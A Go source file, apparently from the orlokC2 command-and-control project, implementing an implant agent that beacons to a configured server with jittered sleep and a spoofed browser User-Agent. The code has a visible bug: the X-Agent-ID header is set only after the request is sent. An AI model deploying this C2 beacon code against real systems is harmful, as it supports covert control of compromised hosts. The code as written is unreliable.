package agent

import (
	"fmt"
	"github.com/faanross/orlokC2/internal/agent/config"
	"io"
	"log"
	"math/rand"
	"net/http"
	"time"
)

type Agent struct {
	Config *config.Config
	client *http.Client

	stopChan chan struct{}

	running   bool
	connected bool
}

func NewAgent(config *config.Config) *Agent {
	return &Agent{
		Config:    config,
		client:    &http.Client{Timeout: config.RequestTimeout},
		stopChan:  make(chan struct{}),
		running:   false,
		connected: false,
	}
}
func (a *Agent) Start() error {
	if a.running {
		return fmt.Errorf("agent already running")
	}

	a.running = true

	go a.runLoop()

	return nil
}
func (a *Agent) Stop() error {
	if !a.running {
		return fmt.Errorf("agent not running")
	}

	close(a.stopChan)
	a.running = false

	fmt.Println("Agent stopped")
	return nil
}
func (a *Agent) runLoop() {
	for {
		select {
		case <-a.stopChan:
			return
		default:
			sleepTime := a.CalculateSleepWithJitter()

			err := a.Connect()
			if err != nil {
				fmt.Printf("Connection error: %v\n", err)
				time.Sleep(sleepTime)
				continue
			}

			resp, err := a.SendRequest(a.Config.Endpoint)
			if err != nil {
				fmt.Printf("Request error: %v\n", err)
				time.Sleep(sleepTime)
				continue
			}

			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()

			if err != nil {
				log.Printf("Error reading response body: %v\n", err)
			} else {
				log.Printf("Response: %s\n", string(body))
			}

			time.Sleep(sleepTime)
		}
	}
}
func (a *Agent) Connect() error {
	url := fmt.Sprintf("http://%s/", a.GetTargetAddress())

	req, err := http.NewRequest("HEAD", url, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	resp, err := a.client.Do(req)
	if err != nil {
		return fmt.Errorf("connection failed: %v", err)
	}
	defer resp.Body.Close()

	a.connected = true
	return nil
}
func (a *Agent) GetTargetAddress() string {
	return fmt.Sprintf("%s:%s", a.Config.TargetHost, a.Config.TargetPort)
}
func (a *Agent) SendRequest(endpoint string) (*http.Response, error) {
	// Check if we're connected
	if !a.connected {
		return nil, fmt.Errorf("not connected to server")
	}

	// Create the full URL
	url := fmt.Sprintf("http://%s%s", a.GetTargetAddress(), endpoint)

	// Create the request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}

	// Add basic headers
	req.Header.Set("User-Agent", "Mozilla/5.0")

	// Send the request
	resp, err := a.client.Do(req)
	if err != nil {
		a.connected = false
		return nil, fmt.Errorf("request failed: %v", err)
	}
	// Add basic headers
	req.Header.Set("User-Agent", "Mozilla/5.0")

	// Add the Agent UUID as a custom header
	req.Header.Set("X-Agent-ID", a.Config.AgentUUID)

	return resp, nil
}
func (a *Agent) CalculateSleepWithJitter() time.Duration {
	// Apply jitter as a percentage of the base sleep time
	jitterFactor := 1.0 + (rand.Float64() * a.Config.Jitter / 100.0)
	return time.Duration(float64(a.Config.Sleep) * jitterFactor)
}
